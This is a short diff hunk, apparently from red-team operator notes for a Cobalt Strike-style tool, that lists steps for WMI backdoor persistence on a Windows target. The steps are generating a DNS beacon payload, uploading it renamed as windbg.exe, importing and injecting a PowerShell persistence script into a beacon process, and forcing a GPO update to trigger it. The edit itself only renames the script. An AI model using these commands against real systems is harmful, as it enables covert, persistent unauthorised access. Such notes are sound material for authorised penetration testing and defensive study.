@@ -1,8 +1,8 @@
 example using WMI...
   generate a DNS payload named dns_x64.exe
   upload to the target and rename to windbg.exe
-  install the backdoor (WMIElevatedPersistence.ps1):
-    powershell-import C:\Tools\WMIPersistence.ps1
+  install the backdoor (WmiPersistence.ps1):
+    powershell-import C:\Tools\WmiPersistence.ps1
     psinject [BEACON PID] x64 Add-WmiPersistence
   trigger the backdoor w a GPO update:
     execute gpupdate /target:computer /force
